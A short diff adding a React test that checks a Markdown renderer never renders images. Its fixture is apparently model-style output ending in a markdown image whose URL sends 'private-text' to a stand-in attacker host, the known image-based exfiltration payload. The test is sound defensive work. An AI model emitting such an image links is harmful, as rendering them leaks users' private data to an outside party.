@@ -19,4 +19,10 @@ describe('Markdown', () => {
         expect(container.querySelector('img')).toBeNull();
         expect(container.querySelector('b')).toBeNull();
     });
+
+    it('never renders a markdown image (the browser would fetch its URL)', () => {
+        const { container } = render(<Markdown text={'Summary done. ![x](https://attacker.example/p?d=private-text)'} />);
+        expect(container.querySelector('img')).toBeNull();
+        expect(screen.getByText(/Summary done\./)).toBeInTheDocument();
+    });
 });
